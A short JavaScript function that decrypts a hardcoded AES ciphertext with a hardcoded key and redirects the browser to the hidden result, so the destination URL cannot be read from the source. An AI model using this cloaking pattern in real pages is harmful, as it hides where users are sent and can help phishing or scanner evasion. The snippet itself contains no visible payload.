function decryptjs() {

var decrypted = CryptoJS.AES.decrypt("U2FsdGVkX18h2d6gdrOKeQ4wwj/eunSL6j39zhaB59DpKYRL2eULuglnjRL90m1FCAmZn3DZmcyGoWN203QZnqIoy1To4K4D143V2M9hWm2p/+azO/SiSaiAAMnV2T06gCv++reK77Fl1pgJbqKQzyvU20jY8gTIuzDN89QuWbc=",
 "W0Ca19sNat1tGuf");

window.location.href = ""+decrypted.toString(CryptoJS.enc.Utf8)+"";
}